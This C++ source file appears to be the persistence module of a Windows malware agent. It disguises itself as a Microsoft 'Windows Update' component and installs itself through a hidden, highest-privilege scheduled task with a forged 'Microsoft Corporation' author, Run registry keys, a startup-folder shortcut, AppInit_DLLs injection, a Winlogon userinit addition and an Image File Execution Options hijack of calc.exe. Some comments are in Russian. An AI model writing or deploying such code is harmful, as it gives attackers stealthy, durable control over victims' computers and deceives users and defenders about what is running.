#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <string>
#include <shlobj.h>
#include "../common.h"
#include "../logger/file_logger.h"
#include "../utils.h"

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

class TaskSchedulerPersistence {
private:
    std::wstring taskName;
    std::wstring executablePath;
    
public:
    TaskSchedulerPersistence() {
        taskName = L"WindowsUpdateCheck"; // Disguised name
        
        // Get current executable path
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        executablePath = path;
    }
    
    bool InstallPersistence() {
        // Try multiple persistence methods
        bool success = false;
        
        // Method 1: Task Scheduler (highest priority)
        if (CreateScheduledTask()) {
            success = true;
            LogSuccess("Task Scheduler persistence installed");
        }
        
        // Method 2: Registry Run key (backup)
        if (CreateRegistryEntry()) {
            success = true;
            LogSuccess("Registry persistence installed");
        }
        
        // Method 3: Startup folder (fallback)
        if (CreateStartupEntry()) {
            success = true;
            LogSuccess("Startup folder persistence installed");
        }
        
        return success;
    }
    
    bool RemoveTaskSchedulerPersistence() {
        bool removed = false;
        
        if (RemoveScheduledTask()) removed = true;
        if (RemoveRegistryEntry()) removed = true;
        if (RemoveStartupEntry()) removed = true;
        
        return removed;
    }
    
private:
    bool CreateScheduledTask() {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        ITaskService* pService = NULL;
        ITaskFolder* pRootFolder = NULL;
        ITaskDefinition* pTask = NULL;
        IRegistrationInfo* pRegInfo = NULL;
        IPrincipal* pPrincipal = NULL;
        ITaskSettings* pSettings = NULL;
        ITriggerCollection* pTriggerCollection = NULL;
        ITrigger* pTrigger = NULL;
        IDailyTrigger* pDailyTrigger = NULL;
        IActionCollection* pActionCollection = NULL;
        IAction* pAction = NULL;
        IExecAction* pExecAction = NULL;
        IRegisteredTask* pRegisteredTask = NULL;
        
        bool success = false;
        
        do {
            // Create Task Service instance
            hr = CoCreateInstance(CLSID_TaskScheduler, NULL,
                                CLSCTX_INPROC_SERVER,
                                IID_ITaskService,
                                (void**)&pService);
            if (FAILED(hr)) break;
            
            // Connect to task service
            hr = pService->Connect(_variant_t(), _variant_t(),
                                 _variant_t(), _variant_t());
            if (FAILED(hr)) break;
            
            // Get root folder
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
            if (FAILED(hr)) break;
            
            // Delete existing task if present
            pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
            
            // Create task definition
            hr = pService->NewTask(0, &pTask);
            if (FAILED(hr)) break;
            
            // Get registration info
            hr = pTask->get_RegistrationInfo(&pRegInfo);
            if (FAILED(hr)) break;
            
            hr = pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
            hr = pRegInfo->put_Description(_bstr_t(L"Windows Update Background Check"));
            
            // Set principal (run with highest privileges)
            hr = pTask->get_Principal(&pPrincipal);
            if (FAILED(hr)) break;
            
            hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
            hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            
            // Set task settings
            hr = pTask->get_Settings(&pSettings);
            if (FAILED(hr)) break;
            
            hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            hr = pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            hr = pSettings->put_Hidden(VARIANT_TRUE);
            hr = pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // No time limit
            
            // Create daily trigger
            hr = pTask->get_Triggers(&pTriggerCollection);
            if (FAILED(hr)) break;
            
            hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
            if (FAILED(hr)) break;
            
            hr = pTrigger->QueryInterface(IID_IDailyTrigger, (void**)&pDailyTrigger);
            if (FAILED(hr)) break;
            
            hr = pDailyTrigger->put_Id(_bstr_t(L"DailyTriggerId"));
            hr = pDailyTrigger->put_DaysInterval(1); // Run daily
            
            // Create action
            hr = pTask->get_Actions(&pActionCollection);
            if (FAILED(hr)) break;
            
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (FAILED(hr)) break;
            
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (FAILED(hr)) break;
            
            hr = pExecAction->put_Path(_bstr_t(executablePath.c_str()));
            hr = pExecAction->put_WorkingDirectory(_bstr_t(L"C:\\Windows\\System32"));
            
            // Register the task
            hr = pRootFolder->RegisterTaskDefinition(
                _bstr_t(taskName.c_str()),
                pTask,
                TASK_CREATE_OR_UPDATE,
                _variant_t(),
                _variant_t(),
                TASK_LOGON_INTERACTIVE_TOKEN,
                _variant_t(L""),
                &pRegisteredTask);
            
            if (SUCCEEDED(hr)) {
                success = true;
            }
            
        } while (false);
        
        // Cleanup
        if (pRegisteredTask) pRegisteredTask->Release();
        if (pExecAction) pExecAction->Release();
        if (pAction) pAction->Release();
        if (pActionCollection) pActionCollection->Release();
        if (pDailyTrigger) pDailyTrigger->Release();
        if (pTrigger) pTrigger->Release();
        if (pTriggerCollection) pTriggerCollection->Release();
        if (pSettings) pSettings->Release();
        if (pPrincipal) pPrincipal->Release();
        if (pRegInfo) pRegInfo->Release();
        if (pTask) pTask->Release();
        if (pRootFolder) pRootFolder->Release();
        if (pService) pService->Release();
        
        CoUninitialize();
        
        return success;
    }
    
    bool CreateRegistryEntry() {
        HKEY hKey;
        LONG result;
        
        // Try HKCU first (doesn't require admin)
        result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExW(
                hKey,
                L"WindowsUpdateCheck",
                0,
                REG_SZ,
                (BYTE*)executablePath.c_str(),
                (DWORD)((executablePath.length() + 1) * sizeof(wchar_t))
            );
            
            RegCloseKey(hKey);
            
            if (result == ERROR_SUCCESS) {
                return true;
            }
        }
        
        // Try HKLM if we have admin rights
        if (Utils::IsUserAdmin()) {
            result = RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
            );
            
            if (result == ERROR_SUCCESS) {
                result = RegSetValueExW(
                    hKey,
                    L"WindowsUpdateCheck",
                    0,
                    REG_SZ,
                    (BYTE*)executablePath.c_str(),
                    (DWORD)((executablePath.length() + 1) * sizeof(wchar_t))
                );
                
                RegCloseKey(hKey);
                
                if (result == ERROR_SUCCESS) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    bool CreateStartupEntry() {
        WCHAR startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::wstring linkPath = std::wstring(startupPath) + L"\\WindowsUpdate.lnk";
            
            // Create shortcut
            IShellLinkW* pShellLink = NULL;
            IPersistFile* pPersistFile = NULL;
            
            HRESULT hr = CoInitialize(NULL);
            if (FAILED(hr)) return false;
            
            hr = CoCreateInstance(
                CLSID_ShellLink,
                NULL,
                CLSCTX_INPROC_SERVER,
                IID_IShellLinkW,
                (LPVOID*)&pShellLink
            );
            
            if (SUCCEEDED(hr)) {
                pShellLink->SetPath(executablePath.c_str());
                pShellLink->SetWorkingDirectory(L"C:\\Windows\\System32");
                pShellLink->SetDescription(L"Windows Update Background Service");
                
                hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
                if (SUCCEEDED(hr)) {
                    hr = pPersistFile->Save(linkPath.c_str(), TRUE);
                    pPersistFile->Release();
                }
                
                pShellLink->Release();
            }
            
            CoUninitialize();
            
            return SUCCEEDED(hr);
        }
        
        return false;
    }
    
    bool RemoveScheduledTask() {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) return false;
        
        ITaskService* pService = NULL;
        ITaskFolder* pRootFolder = NULL;
        
        bool success = false;
        
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL,
                            CLSCTX_INPROC_SERVER,
                            IID_ITaskService,
                            (void**)&pService);
        
        if (SUCCEEDED(hr)) {
            hr = pService->Connect(_variant_t(), _variant_t(),
                                 _variant_t(), _variant_t());
            
            if (SUCCEEDED(hr)) {
                hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
                
                if (SUCCEEDED(hr)) {
                    hr = pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
                    if (SUCCEEDED(hr)) {
                        success = true;
                    }
                    
                    pRootFolder->Release();
                }
            }
            
            pService->Release();
        }
        
        CoUninitialize();
        
        return success;
    }
    
    bool RemoveRegistryEntry() {
        bool removed = false;
        
        // Remove from HKCU
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            if (RegDeleteValueW(hKey, L"WindowsUpdateCheck") == ERROR_SUCCESS) {
                removed = true;
            }
            RegCloseKey(hKey);
        }
        
        // Remove from HKLM if we have admin rights
        if (Utils::IsUserAdmin()) {
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                if (RegDeleteValueW(hKey, L"WindowsUpdateCheck") == ERROR_SUCCESS) {
                    removed = true;
                }
                RegCloseKey(hKey);
            }
        }
        
        return removed;
    }
    
    bool RemoveStartupEntry() {
        WCHAR startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::wstring linkPath = std::wstring(startupPath) + L"\\WindowsUpdate.lnk";
            
            if (DeleteFileW(linkPath.c_str())) {
                return true;
            }
        }
        
        return false;
    }
    
    void LogSuccess(const char* message) {
        extern void LogInfo(const char*);
        LogInfo(message);
    }
};

// Alternative registry persistence
class RegistryPersistence {
public:
    bool InstallAlternativePersistence() {
        // Additional persistence methods
        
        // Method 1: AppInit_DLLs (requires admin)
        if (Utils::IsUserAdmin()) {
            InstallAppInitDLL();
        }
        
        // Method 2: Winlogon
        InstallWinlogonEntry();
        
        // Method 3: Image File Execution Options
        InstallIFEO();
        
        return true;
    }
    
private:
    void InstallAppInitDLL() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                         0, KEY_WRITE | KEY_READ, &hKey) == ERROR_SUCCESS) {
            // Получить текущие значения
            wchar_t dlls[1024] = {0};
            DWORD size = sizeof(dlls);
            RegQueryValueExW(hKey, L"AppInit_DLLs", NULL, NULL, (LPBYTE)dlls, &size);

            // Путь к агенту DLL
            std::wstring agentDllPath = L"C:\\Windows\\System32\\myagent.dll";
            
            // Добавить путь если его ещё нет
            std::wstring newValue = dlls;
            if (newValue.find(agentDllPath) == std::wstring::npos) {
                if (!newValue.empty() && newValue.back() != L' ') newValue += L' ';
                newValue += agentDllPath;

                RegSetValueExW(hKey, L"AppInit_DLLs", 0, REG_SZ,
                               (BYTE*)newValue.c_str(), (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
                
                // Включить загрузку DLL (LoadAppInit_DLLs = 1)
                DWORD enable = 1;
                RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD,
                               (BYTE*)&enable, sizeof(enable));
            }
            RegCloseKey(hKey);
        }
    }
    
    void InstallWinlogonEntry() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                         0, KEY_WRITE | KEY_READ, &hKey) == ERROR_SUCCESS) {
            std::wstring agentPath = L"C:\\Windows\\System32\\myagent.exe";

            // Добавить свой EXE к userinit
            wchar_t userinit[1024] = {0};
            DWORD size = sizeof(userinit);
            RegQueryValueExW(hKey, L"userinit", NULL, NULL, (LPBYTE)userinit, &size);

            std::wstring newValue = userinit;
            if (newValue.find(agentPath) == std::wstring::npos) {
                if (!newValue.empty() && newValue.back() != L',') newValue += L',';
                newValue += agentPath;

                RegSetValueExW(hKey, L"userinit", 0, REG_SZ,
                               (BYTE*)newValue.c_str(), (DWORD)((newValue.length() + 1) * sizeof(wchar_t)));
            }
            RegCloseKey(hKey);
        }
    }
    
    void InstallIFEO() {
        HKEY hKey;
        // Перехват запуска calc.exe
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe",
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            std::wstring agentPath = L"C:\\Windows\\System32\\myagent.exe";
            RegSetValueExW(hKey, L"Debugger", 0, REG_SZ,
                           (BYTE*)agentPath.c_str(), (DWORD)((agentPath.length() + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }
    }
};

// Export functions for main agent
extern "C" {
    bool InstallPersistence() {
        TaskSchedulerPersistence taskPersistence;
        RegistryPersistence regPersistence;
        
        bool success = false;
        
        // Try primary persistence methods
        if (taskPersistence.InstallPersistence()) {
            success = true;
        }
        
        // Install alternative persistence methods if we have admin rights
        if (Utils::IsUserAdmin()) {
            if (regPersistence.InstallAlternativePersistence()) {
                success = true;
            }
        }
        
        return success;
    }
    
    bool RemoveTaskSchedulerPersistence() {
        TaskSchedulerPersistence persistence;
        return persistence.RemoveTaskSchedulerPersistence();
    }
}